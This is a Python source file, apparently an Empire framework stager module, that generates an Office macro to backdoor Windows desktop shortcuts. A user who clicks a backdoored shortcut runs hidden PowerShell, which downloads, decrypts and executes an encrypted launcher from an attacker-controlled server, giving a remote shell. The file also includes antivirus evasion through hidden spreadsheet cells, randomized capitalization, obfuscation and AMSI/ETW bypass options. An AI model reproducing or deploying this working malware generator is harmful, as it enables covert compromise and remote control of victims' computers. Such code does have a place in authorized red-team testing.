from __future__ import print_function

import datetime
import random
import string
import xlrd
from builtins import chr
from builtins import object
from builtins import range
from builtins import str

from Crypto.Cipher import AES
from xlutils.copy import copy
from xlwt import Workbook

from empire.server.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'BackdoorLnkMacro',

            'Author': ['@G0ldenGunSec'],

            'Description': 'Generates a macro that backdoors .lnk files on the users desktop, backdoored lnk files in '
                           'turn attempt to download & execute an empire launcher when the user clicks on them. '
                           'Usage: Three files will be spawned from this, an xls document (either new or containing '
                           'existing contents) that data will be placed into, a macro that should be placed in the '
                           'spawned xls document, and an xml that should be placed on a web server accessible by the '
                           'remote system (as defined during stager generation).  By default this xml is written to '
                           '/var/www/html, which is the webroot on debian-based systems such as kali.',

            'Comments': ['Two-stage macro attack vector used for bypassing tools that perform monitor parent '
                         'processes and flag / block process launches from unexpected programs, such as office. The '
                         'initial run of the macro is vbscript and spawns no child processes, instead it backdoors '
                         'targeted shortcuts on the users desktop to do a direct run of powershell next time they are '
                         'clicked.  The second step occurs when the user clicks on the shortcut, the powershell '
                         'download stub that runs will attempt to download & execute an empire launcher from an xml '
                         'file hosted on a pre-defined webserver, which will in turn grant a full shell.  Credits to '
                         '@harmJ0y and @enigma0x3 for designing the macro stager that this was originally based on, '
                         '@subTee for research pertaining to the xml.xmldocument cradle, and @curi0usJack for info on '
                         'using cell embeds to evade AV.']
        }
        # random name our xml will default to in stager options
        xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(5, 9)))

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': '',
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for '
                               'obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For '
                               'powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'Language': {
                'Description': 'Language of the launcher to generate.',
                'Required': True,
                'Value': 'powershell'
            },
            'TargetEXEs': {
                'Description': 'Will backdoor .lnk files pointing to selected executables (do not include .exe '
                               'extension), enter a comma seperated list of target exe names - ex. iexplore,firefox,'
                               'chrome',
                'Required': True,
                'Value': 'iexplore,firefox,chrome'
            },
            'XmlUrl': {
                'Description': 'remotely-accessible URL to access the XML containing launcher code. Please try and '
                               'keep this URL short, as it must fit in the given 1024 chars for args along with all '
                               'other logic - default options typically allow for 100-200 chars of extra space, '
                               'depending on targeted exe',
                'Required': True,
                'Value': "http://" + helpers.lhost() + "/" + xmlVar + ".xml"
            },
            'XlsOutFile': {
                'Description': 'XLS (incompatible with xlsx/xlsm) file to output stager payload to. If document does '
                               'not exist / cannot be found a new file will be created',
                'Required': True,
                'Value': '/tmp/default.xls'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output, otherwise returned as a string.',
                'Required': False,
                'Value': 'macro'
            },
            'XmlOutFile': {
                'Description': 'Local path + file to output xml to.',
                'Required': True,
                'Value': '/var/www/html/' + xmlVar + '.xml'
            },
            'KillDate': {
                'Description': 'Date after which the initial powershell stub will no longer attempt to download and '
                               'execute code, set this for the end of your campaign / engagement. Format mm/dd/yyyy',
                'Required': True,
                'Value': datetime.datetime.now().strftime("%m/%d/%Y")
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other) (2nd stage).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other) (2nd stage).',
                'Required': False,
                'Value': 'default'
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting (2nd stage).',
                'Required': False,
                'Value': '0'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, '
                               'or other) (2nd stage).',
                'Required': False,
                'Value': 'default'
            },
            'Bypasses': {
                'Description': 'Bypasses as a space separated list to be prepended to the launcher',
                'Required': False,
                'Value': 'mattifestation etw'
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    # function to convert row + col coords into excel cells (ex. 30,40 -> AE40)
    @staticmethod
    def coordsToCell(row, col):
        coords = ""
        if ((col) // 26 > 0):
            coords = coords + chr(((col) // 26) + 64)
        if ((col + 1) % 26 > 0):
            coords = coords + chr(((col + 1) % 26) + 64)
        else:
            coords = coords + 'Z'
        coords = coords + str(row + 1)
        return coords

    def generate(self):
        # default booleans to false
        obfuscate_script = False

        # extract all of our options
        language = self.options['Language']['Value']
        listener_name = self.options['Listener']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        target_exe = self.options['TargetEXEs']['Value']
        xls_out = self.options['XlsOutFile']['Value']
        xml_path = self.options['XmlUrl']['Value']
        xml_out = self.options['XmlOutFile']['Value']
        bypasses = self.options['Bypasses']['Value']

        if self.options['Obfuscate']['Value'].lower == "true":
            obfuscate_script = True

        obfuscate_command = self.options['ObfuscateCommand']['Value']

        # catching common ways date is incorrectly entered
        kill_date = self.options['KillDate']['Value'].replace('\\', '/').replace(' ', '').split('/')
        if (int(kill_date[2]) < 100):
            kill_date[2] = int(kill_date[2]) + 2000
        target_exe = target_exe.split(',')
        target_exe = [_f for _f in target_exe if _f]

        # set vars to random alphabetical / alphanumeric values
        shell_var = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6, 9)))
        lnk_var = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6, 9)))
        fso_var = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6, 9)))
        folder_var = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6, 9)))
        file_var = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6, 9)))
        enc_key = ''.join(
            random.sample(string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation,
                          random.randint(16, 16)))
        # avoiding potential escape characters in our decryption key for the second stage payload
        for ch in ["\"", "'", "`"]:
            if ch in enc_key:
                enc_key = enc_key.replace(ch, random.choice(string.ascii_lowercase))
        enc_iv = random.randint(1, 240)

        # generate the launcher
        if language.lower() == "python":
            launcher = self.mainMenu.stagers.generate_launcher(listenerName=listener_name, language=language,
                                                               encode=False,
                                                               userAgent=user_agent, proxy=proxy,
                                                               proxyCreds=proxy_creds,
                                                               stagerRetries=stager_retries)
        else:
            launcher = self.mainMenu.stagers.generate_launcher(listenerName=listener_name, language=language,
                                                               encode=True,
                                                               obfuscate=obfuscate_script,
                                                               obfuscationCommand=obfuscate_command,
                                                               userAgent=user_agent,
                                                               proxy=proxy, proxyCreds=proxy_creds,
                                                               stagerRetries=stager_retries, bypasses=bypasses)

        launcher = launcher.replace("\"", "'")

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        else:
            try:
                reader = xlrd.open_workbook(xls_out)
                work_book = copy(reader)
                active_sheet = work_book.get_sheet(0)
            except (IOError, OSError):
                work_book = Workbook()
                active_sheet = work_book.add_sheet('Sheet1')

            # sets initial coords for writing data to
            input_row = random.randint(50, 70)
            input_col = random.randint(40, 60)

            # build out the macro - first take all strings that would normally go into the macro and place them into random cells, which we then reference in our macro
            macro = "Sub Auto_Close()\n"

            active_sheet.write(input_row, input_col, helpers.randomize_capitalization("Wscript.shell"))
            macro += "Set " + shell_var + " = CreateObject(activeSheet.Range(\"" + self.coordsToCell(input_row,
                                                                                                    input_col) + "\").value)\n"
            input_col = input_col + random.randint(1, 4)

            active_sheet.write(input_row, input_col, helpers.randomize_capitalization("Scripting.FileSystemObject"))
            macro += "Set " + fso_var + " = CreateObject(activeSheet.Range(\"" + self.coordsToCell(input_row,
                                                                                                  input_col) + "\").value)\n"
            input_col = input_col + random.randint(1, 4)

            active_sheet.write(input_row, input_col, helpers.randomize_capitalization("desktop"))
            macro += "Set " + folder_var + " = " + fso_var + ".GetFolder(" + shell_var + ".SpecialFolders(activeSheet.Range(\"" + self.coordsToCell(
                input_row, input_col) + "\").value))\n"
            macro += "For Each " + file_var + " In " + folder_var + ".Files\n"

            macro += "If(InStr(Lcase(" + file_var + "), \".lnk\")) Then\n"
            macro += "Set " + lnk_var + " = " + shell_var + ".CreateShortcut(" + shell_var + ".SPecialFolders(activeSheet.Range(\"" + self.coordsToCell(
                input_row, input_col) + "\").value) & \"\\\" & " + file_var + ".name)\n"
            input_col = input_col + random.randint(1, 4)

            macro += "If("
            for i, item in enumerate(target_exe):
                if i:
                    macro += (' or ')
                active_sheet.write(input_row, input_col, target_exe[i].strip().lower() + ".")
                macro += "InStr(Lcase(" + lnk_var + ".targetPath), activeSheet.Range(\"" + self.coordsToCell(input_row,
                                                                                                            input_col) + "\").value)"
                input_col = input_col + random.randint(1, 4)
            macro += ") Then\n"
            # launchString contains the code that will get insterted into the backdoored .lnk files, it will first launch the original target exe, then clean up all backdoors on the desktop.  After cleanup is completed it will check the current date, if it is prior to the killdate the second stage will then be downloaded from the webserver selected during macro generation, and then decrypted using the key and iv created during this same process.  This code is then executed to gain a full agent on the remote system.
            launch_string1 = "hidden -nop -c \"Start(\'"
            launch_string2 = ");$u=New-Object -comObject wscript.shell;gci -Pa $env:USERPROFILE\desktop -Fi *.lnk|%{$l=$u.createShortcut($_.FullName);if($l.arguments-like\'*xml.xmldocument*\'){$s=$l.arguments.IndexOf(\'\'\'\')+1;$r=$l.arguments.Substring($s, $l.arguments.IndexOf(\'\'\'\',$s)-$s);$l.targetPath=$r;$l.Arguments=\'\';$l.Save()}};$b=New-Object System.Xml.XmlDocument;if([int](get-date -U "
            launch_string3 = ") -le " + str(kill_date[2]) + str(kill_date[0]) + str(kill_date[1]) + "){$b.Load(\'"
            launch_string4 = "\');$a=New-Object 'Security.Cryptography.AesManaged';$a.IV=(" + str(enc_iv) + ".." + str(
                enc_iv + 15) + ");$a.key=[text.encoding]::UTF8.getBytes('"
            launch_string5 = "');$by=[System.Convert]::FromBase64String($b.main);[Text.Encoding]::UTF8.GetString($a.CreateDecryptor().TransformFinalBlock($by,0,$by.Length)).substring(16)|iex}\""

            # part of the macro that actually modifies the LNK files on the desktop, sets icon location for updated lnk to the old targetpath, args to our launch code, and target to powershell so we can do a direct call to it
            macro += lnk_var + ".IconLocation = " + lnk_var + ".targetpath\n"
            launch_string1 = helpers.randomize_capitalization(launch_string1)
            launch_string2 = helpers.randomize_capitalization(launch_string2)
            launch_string3 = helpers.randomize_capitalization(launch_string3)
            launch_string4 = helpers.randomize_capitalization(launch_string4)
            launch_string5 = helpers.randomize_capitalization(launch_string5)
            launch_string_sum = launch_string2 + "'%Y%m%d'" + launch_string3 + xml_path + launch_string4 + enc_key + launch_string5

            active_sheet.write(input_row, input_col, launch_string1)
            launch1_coords = self.coordsToCell(input_row, input_col)
            input_col = input_col + random.randint(1, 4)
            active_sheet.write(input_row, input_col, launch_string_sum)
            launch_sum_coords = self.coordsToCell(input_row, input_col)
            input_col = input_col + random.randint(1, 4)

            macro += lnk_var + ".arguments = \"-w \" & activeSheet.Range(\"" + launch1_coords + "\").Value & " + lnk_var + ".targetPath" + " & \"'\" & activeSheet.Range(\"" + launch_sum_coords + "\").Value" + "\n"

            active_sheet.write(input_row, input_col, helpers.randomize_capitalization(
                ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
            macro += lnk_var + ".targetpath = left(CurDir, InStr(CurDir, \":\")-1) & activeSheet.Range(\"" + self.coordsToCell(
                input_row, input_col) + "\").value\n"
            input_col = input_col + random.randint(1, 4)
            # macro will not write backdoored lnk file if resulting args will be > 1024 length (max arg length) - this is to avoid an incomplete statement that results in a powershell error on run, which causes no execution of any programs and no cleanup of backdoors
            macro += "if(Len(" + lnk_var + ".arguments) < 1023) Then\n"
            macro += lnk_var + ".save\n"
            macro += "end if\n"
            macro += "end if\n"
            macro += "end if\n"
            macro += "next " + file_var + "\n"
            macro += "End Sub\n"
            active_sheet.row(input_row).hidden = True
            print(helpers.color("\nWriting xls...\n", color="blue"))
            work_book.save(xls_out)
            print(helpers.color(
                "xls written to " + xls_out + "  please remember to add macro code to xls prior to use\n\n",
                color="green"))

            # encrypt the second stage code that will be dropped into the XML - this is the full empire stager that gets pulled once the user clicks on the backdoored shortcut
            iv_buf = ("").encode('UTF-8')
            for z in range(0, 16):
                iv = enc_iv + z
                iv = iv.to_bytes(1, byteorder='big')
                iv_buf = b"".join([iv_buf, iv])

            encryptor = AES.new(enc_key.encode('UTF-8'), AES.MODE_CBC, iv_buf)

            # pkcs7 padding - aes standard on Windows - if this padding mechanism is used we do not need to define padding in our macro code, saving space
            padding = 16 - (len(launcher) % 16)
            if padding == 0:
                launcher = launcher + ('\x00' * 16)
            else:
                launcher = launcher + (chr(padding) * padding)

            cipher_text = encryptor.encrypt(launcher.encode('UTF-8'))
            cipher_text = helpers.encode_base64(b"".join([iv_buf, cipher_text]))

            # write XML to disk
            print(helpers.color("Writing xml...\n", color="blue"))
            with open(xml_out, "wb") as file_write:
                file_write.write(b"<?xml version=\"1.0\"?>\n")
                file_write.write(b"<main>")
                file_write.write(cipher_text)
                file_write.write(b"</main>\n")
            print(helpers.color(
                "xml written to " + xml_out + " please remember this file must be accessible by the target at this url: " + xml_path + "\n",
                color="green"))

            return macro
